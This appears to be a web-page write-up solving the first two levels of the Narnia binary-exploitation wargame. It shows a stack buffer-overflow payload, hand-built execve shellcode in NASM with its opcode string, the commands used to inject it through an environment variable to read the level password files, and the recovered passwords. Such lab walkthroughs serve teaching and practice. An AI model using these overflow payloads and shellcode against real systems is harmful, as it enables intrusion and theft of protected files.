        Narnia is a series of wargames designed to teach basic binary exploitation. Most of the bugs in the game 
        are easy to see or are common exploits that are easily researchable. We are also given the source code for each binary to spot the vulnerability and exploit it.
    </p>
    <br>
    
    <div class="c2">
        All Narnia Levels:
    <a href="#0to1">Level 0 to 1</a>

    <h1>Level 0 to Level 1</h1><br>
    <p>To get started, we ssh into <strong>narnia0</strong> at <strong>narnia.labs.overthewire.org</strong> at port <strong>2226</strong>. 
    From there, in the <strong>/narnia</strong> folder, we see all the binaries and their source code. The only one we can access is <strong>narnia0 and narnia0.c</strong>.</p><br>
    <p>Looking at the C file first, we see it tell us to change <strong>val</strong> from <strong>0x41414141</strong> to <strong>0xdeadbeef</strong> to get access to <strong>/etc/narnia_pass/narnia1</strong>. The 
    only input have in the program is <strong>buf</strong>, a char array of length 20.</p><br>
    <img src="../images/n0source.png"><br><br>
    <p>We can see the vulnerability in the code. Namely the scanf function. We are scanning a line into <strong>buf</strong> of length 24, but <strong>buf</strong> is only of length 20. This means the last 4 chars scanned will overwrite memory in the stack.</p><br>
    <p>We can verify this by looking at the dump of the binary file.</p><br>
    <img src="../images/n0dump.png"><br><br>
    <p>We can see at where <strong>var</strong> is pushed onto the stack at <strong>-0x8(%ebp)</strong></p><br>
    <div class="boxed">
        8048562:	c7 45 f8 41 41 41 41 	movl   $0x41414141,-0x8(%ebp)
    </div><br>
    <p>We can also find where the beginning of <strong>buf</strong> is located as one of the aguments loaded into the <strong>scanf</strong> function: </p><br>
    <div class="boxed">
        8048583:	8d 45 e4             	lea    -0x1c(%ebp),%eax
    </div><br>
    <p>This verifies that the length of <strong>buf</strong> is 20 as 0x1c - 0x8 = 0x14 or 20 in base 10, which is what we expected.</p><br>
    <p>What we need to do is known as a buffer overflow exploit. This is when we write more data than expected into a buffer and overwrite specific areas of memory. 
        We know that <strong>buf</strong> is 20 chars long, and that we are reading 24 chars. We also know that <strong>var</strong> contains 8 bytes, as it is a long type. 
        So to finish the exploit, we can enter any 20 characters, and then write the bytes that make <strong>0xdeadbeef</strong> in reverse order, as the stack grows downward.
        Another issue we can see from the source code is that we will call <strong>/bin/sh</strong> and it will exit immediately. To keep the terminal open, we also need to call <strong>cat</strong> with no arguments and it will pipe output to the terminal.
        The full command looks like this:
    </p><br>
    <div class="boxed">
        ( echo -e "AAAAAAAAAAAAAAAAAAAA\xEF\xBE\xAD\xDE" ; cat ) | ./narnia0
    </div><br>

    <p>So we have the password for level 1, <strong>efeidiedae</strong></p>

    <h1>Level 1 to Level 2</h1><br>
    <p>For this level, we start by taking a look at <strong>narnia1.c</strong></p><br>
    <img src="../images/n1Cfile.png"><br><br>
    <p>We can see that whatever is in the environment variable <strong>EGG</strong>, the first value will overwrite <strong>RET</strong>,
        This gives us the ability to control <strong>EIP</strong>, or the instruction pointer. 
        When <strong>RET</strong> is read off the stack and placed into EIP, the instruction at the address will be executed.
        So what we need to do is create injectable shellcode and store it in the environment variable <strong>EGG</strong>, then 
        once <strong>RET</strong> is read off the stack, the next instruction will be at the beginning of our shellcode and will start to execute.
    </p><br>
    <p>Now for creating the shellcode. We first have to decide what is the exact thing we want the shellcode to do. For this challenge, 
        we want to execute <strong>/bin/cat /etc/narnia_pass/narnia2</strong> in some way.
    </p><br>
    <p>The first step in creating shellcode is to create a simple C program that does what you want to do, analyze the instructions, and extract the opcodes that make the program run. The simplest way to 
        create a new process in C is by using <strong>execve</strong>, this executes a program in place of the existing one. We can see how to execute <strong>/bin/cat /home/john/file1</strong>, which is a 
        file containing Lorem Ipsum text, using <strong>execve</strong>.
    </p><br>
    <img src="../images/n1execve.png"><br><br>
    <p>The <strong>execve</strong> call has a few arguments of interest</p><br>
    <div class="boxed">
        int execve(const char *filename, char *const argv[], char *const envp[]);
    </div><br>
    <p>We execute the program pointed to by <strong>filename</strong>, which must be a binary executable or executable script.
    Second, <strong>argv</strong> is the array of argument strings passed to the new program, including the program name itsself. And 
lastly, the argument <strong>envp</strong> is an array containing environment variables. This is not of interest to us now, so we leave that value as <strong>NULL</strong>.</p><br>
    <p>To get started on the shellcode, we have to figure out how <strong>execve</strong> is called in assembly language. This is largely taken from Chapter 3 in "The Shellcoder's Handbook: Discovering and Exploiting Security Holes, Second Edition"</p><br>
    <p>The first instruction of importance is loading the address of the <strong>/bin/cat</strong> string into the <strong>ebx</strong> register. Next we load the address of the argument array into the <strong>ecx</strong> register. 
    Then, we place the address of <strong>envp</strong> into the <strong>edx</strong> register, which in our case is null. Lastly, we have to load the syscall number for <strong>execve</strong> into <strong>eax</strong>, which is 11. 
The last step is to switch to kernel mode, executing the syscall in <strong>eax</strong>. We do this by using the <strong>int 0x80</strong> instruction.</p><br>
    <p>What follows is the assembly code performing these instructions.</p><br>
    <div class="boxed">
        section .text
        <p class="tab">global _start</p>
        _start:<br>
        <p class="tab">xor eax, eax</p>
        <p class="tab">cdq</p>
        <p class="tab">mov al, 0xb</p>
        <p class="tab">push dword "/cat"</p>
        <p class="tab">push dword "/bin"</p>
        <p class="tab">mov ebx,esp</p>
        <p class="tab">push edx</p>
        <p class="tab">push dword "nia2"</p>
        <p class="tab">push dword "/nar"</p>
        <p class="tab">push dword "pass"</p>
        <p class="tab">push dword "nia_"</p>
        <p class="tab">push dword "/nar"</p>
        <p class="tab">push dword "/etc"</p>
        <p class="tab">mov ecx,esp</p>
        <p class="tab">push edx</p>
        <p class="tab">mov edx,esp</p>
        <p class="tab">push ecx</p>
        <p class="tab">push ebx</p>
        <p class="tab">mov ecx,esp</p>
        <p class="tab">int 0x80</p>
    </div><br>
    <p>We can save this as catFile.nasm. Then we have to assemble the file and extract the opcodes to create the finalized shellcode.</p><br>
    <p>To assemble, we are going to use nasm.</p><br>
    <div class="boxed">
        nasm -o catFile -f elf32 -O0 catFile.nasm
    </div><br>
    <p>This gives us the assembled version of our nasm file in <strong>catFile</strong>. Next to get the opcodes, we dump the .text area of the elf binary file we created using <strong>objcopy</strong>, 
    and then use <strong>od</strong> to read the dump in hex format.</p><br>
    <div class="boxed">
        objcopy -O binary -j .text catFile catFileHex<br>
        od -An -t x1 catFileHex
    </div><br>
    <p>All together, these commands give us the opcodes we need for the injectable shellcode.</p><br>
    <img src="../images/n1opcodes.png"><br><br>
    <p>Finally, we set the environment variable <strong>EGG</strong> to be a string containing these values and run the executable.</p><br>
    <div class="boxed">
        (export EGG=`perl -e 'print("\x31\xc0\x99\xb0\x0b\x52\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x52\x68\x6e\x69\x61\x32\x68\x2f\x6e\x61\x72\x68\x70\x61\x73\x73\x68\x6e\x69\x61\x5f\x68\x2f\x6e\x61\x72\x68\x2f\x65\x74\x63\x89\xe1\x52\x89\xe2\x51\x53\x89\xe1\xcd\x80")'` ; ./narnia1)
    </div><br>
    <img src="../images/n1final.png"><br><br>
    <p>So we have th password to level 2 is <strong>nairiepecu</strong></p>
